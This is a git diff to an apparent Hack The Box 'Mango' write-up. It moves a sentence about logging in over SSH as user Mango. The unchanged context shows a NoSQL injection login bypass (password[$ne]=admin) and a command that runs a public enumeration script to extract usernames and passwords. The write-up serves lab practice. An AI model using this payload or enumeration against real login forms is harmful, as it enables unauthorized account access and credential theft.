@@ -30,7 +30,7 @@ username=admin&password[$ne]=admin&login=login
 
 <br>
 
-We can enumerate users and password with [this script](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master).
+We can enumerate users and password with [this script](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master) and login as user Mango with the first password in SSH.
 
 ```
 python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -op login=login -m POST
@@ -43,8 +43,6 @@ python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username 
 ![passwordEnum](https://github.com/b1d0ws/OSCP/assets/58514930/8454cefd-cfca-4811-8c75-a5c160e0852b)
 
 <br>
-
-Login as user Mango with the first password in SSH.
 
 ### Root Flag
 
